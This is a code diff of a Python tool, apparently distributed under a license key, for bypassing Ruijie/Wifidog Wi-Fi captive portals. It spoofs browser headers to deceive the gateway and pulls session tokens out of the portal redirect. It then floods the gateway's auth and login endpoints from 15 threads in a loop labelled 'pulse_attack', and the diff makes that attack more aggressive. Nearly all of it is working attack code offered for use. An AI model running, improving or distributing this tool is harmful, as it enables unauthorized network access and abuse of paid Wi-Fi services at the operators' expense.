@@ -12,7 +12,6 @@ from urllib.parse import urlparse, parse_qs
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
-from rich.text import Text
 
 # ===============================
 # CONFIG & INITIALIZATION
@@ -23,58 +22,40 @@ console = Console()
 KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 PING_THREADS = 15
 
-# COLORS FOR TERMINAL
-G = "\033[92m" # Green
-R = "\033[91m" # Red
-C = "\033[96m" # Cyan
-Y = "\033[93m" # Yellow
-W = "\033[0m"  # White/Reset
+# TERMINAL COLORS (Fixed formatting)
+G = "\033[1;92m" # Bold Green
+C = "\033[1;96m" # Bold Cyan
+R = "\033[1;91m" # Bold Red
+Y = "\033[1;93m" # Bold Yellow
+W = "\033[0m"    # Reset
 
-# LOGO & BANNER
-BABY_LOGO = """
-[bold cyan]
-      _      
-    _(_)_    
-   (_)@(_)   [white] <( Ruijie Multi-Bypass )[/white]
-     (_)\  / 
-      /  ||  
-  ___/___||___
- |____________|
-[/bold cyan]
-"""
-
-BANNER = """
-[bold #00FF00]
+# BANNER
+BANNER = """[bold #00FF00]
  ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
  ║║║║ ║║╣   ╚╦╝║ ║
  ╩ ╩╚═╝╚═╝   ╩ ╚═╝
       M O E   Y U   H A C K E R
-[/bold #00FF00]
-"""
+[/]"""
 
 # ===============================
-# SECURITY SYSTEM (HWID & KEY)
+# SECURITY SYSTEM
 # ===============================
 
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
-    try:
-        if os.path.exists(id_file):
-            with open(id_file, "r") as f: return f.read().strip()
-        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
-        with open(id_file, "w") as f: f.write(new_id)
-        return new_id
-    except: return "MOE-DEFAULT-999"
+    if os.path.exists(id_file):
+        with open(id_file, "r") as f: return f.read().strip()
+    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
+    with open(id_file, "w") as f: f.write(new_id)
+    return new_id
 
 def check_license():
     my_hwid = get_hwid()
     console.clear()
-    console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center(Panel(f"[white]YOUR HWID: [yellow]{my_hwid}[/yellow][/white]", title=f"[bold red]SECURITY[/]", border_style="cyan", expand=False)))
-    
+    console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", expand=False)))
     try:
-        user_key = input(f"\n  {W}[ACCESS_KEY] @MoeYu_").strip()
+        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
         if not user_key: sys.exit()
         
         res = requests.get(KEY_URL, timeout=10).text
@@ -89,71 +70,73 @@ def check_license():
         sys.exit()
 
 # ===============================
-# CORE BYPASS ENGINE
+# CORE BYPASS ENGINE v14.0
 # ===============================
 
 def start_bypass_process():
-    console.print(Panel(Align.center("[bold white]🔥 MOE YU UNIVERSAL BYPASS ACTIVATED 🔥[/bold white]"), border_style="red", expand=False))
+    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO ACTIVATED 🔥[/bold white]"), border_style="red", expand=False))
     
     session = requests.Session()
-    # Ruijie က Script လို့ မသိအောင် Chrome Header အပြည့်အစုံသုံးသည်
+    # Ruijie Server ကို လှည့်စားရန် Browser Header အပြည့်အစုံ
     session.headers.update({
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Accept': '*/*',
-        'Connection': 'keep-alive'
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1'
     })
 
     while True:
         try:
-            # Check Connection
+            # အင်တာနက် စစ်ဆေးခြင်း
             check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
             
             if check.status_code == 204:
-                sys.stdout.write(f"\r{G}[+] Status: Connected & Online. Monitoring...{W}")
+                sys.stdout.write(f"\r{G}[✓] STATUS: ONLINE | ENJOY YOUR INTERNET! ✅ {W}")
                 sys.stdout.flush()
                 time.sleep(10)
                 continue
 
-            # If trapped in Portal
+            # Redirect ဖြစ်သွားလျှင် URL ထဲမှ Parameter များ ဆွဲထုတ်ခြင်း
             portal_url = check.url
             query = parse_qs(urlparse(portal_url).query)
             
-            # ပုံထဲက chap_challenge (token အသစ်) ကို ဖတ်ခြင်း
+            # Ruijie logic အသစ် (chap_challenge) ကို အဓိကထားဖတ်ခြင်း
             sid = (query.get('chap_challenge', [None])[0] or 
                    query.get('sessionId', [None])[0] or 
                    query.get('token', [None])[0])
             
-            # Gateway IP ကို Dynamic ရှာဖွေခြင်း
             gw_ip = query.get('gw_address', [None])[0] or urlparse(portal_url).netloc.split(':')[0]
             gw_port = query.get('gw_port', ['2060'])[0]
 
             if sid and gw_ip:
-                # Wifidog Auth Link
+                # Gateway Link များ တည်ဆောက်ခြင်း
                 auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
+                login_post = f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}"
                 
                 def pulse_attack():
                     while True:
                         try:
-                            # Server ဆီ High-frequency Pulse ပို့ခြင်း
+                            # တစ်ပြိုင်နက်တည်းမှာ Auth ရော Login Request ပါ Inject လုပ်ခြင်း
                             session.get(auth_link, timeout=5)
-                            # Formatting ပြင်ဆင်ထားသော Live Status
-                            sys.stdout.write(f"\r{C}[✓] Pulse Active | Gateway: {gw_ip} | Token Captured{W}")
+                            session.get(login_post, timeout=5)
+                            sys.stdout.write(f"\r{C}[!] Injecting: {gw_ip} | Token: {sid[:15]}... | Turbo Active {W}")
                             sys.stdout.flush()
                         except: pass
-                        time.sleep(0.05) 
+                        time.sleep(0.08) 
 
                 for _ in range(PING_THREADS):
                     threading.Thread(target=pulse_attack, daemon=True).start()
                 
-                # အင်တာနက်ရမရ စစ်ဆေးခြင်း
-                while True:
+                # အင်တာနက် စတင်ပွင့်လာရန် ခေတ္တစောင့်ခြင်း
+                for _ in range(12):
                     try:
-                        if session.get("http://www.google.com", timeout=5).status_code == 200:
-                            time.sleep(10)
-                        else: break
-                    except: break
+                        if session.get("http://www.google.com", timeout=3).status_code == 200:
+                            break
+                    except: pass
+                    time.sleep(1)
             else:
-                console.print(f"{R}[×] Failed to Capture Token. Please open Login Page first.{W}")
+                console.print(f"{R}[×] Failed to Capture Token. Please open Portal in Browser once!{W}")
                 time.sleep(5)
 
         except Exception as e:
@@ -164,5 +147,5 @@ if __name__ == "__main__":
         if check_license():
             start_bypass_process()
     except KeyboardInterrupt:
-        console.print(f"\n{R}[!] Stopped.{W}")
+        console.print(f"\n{R}[!] Stopping Engine...{W}")
         sys.exit()
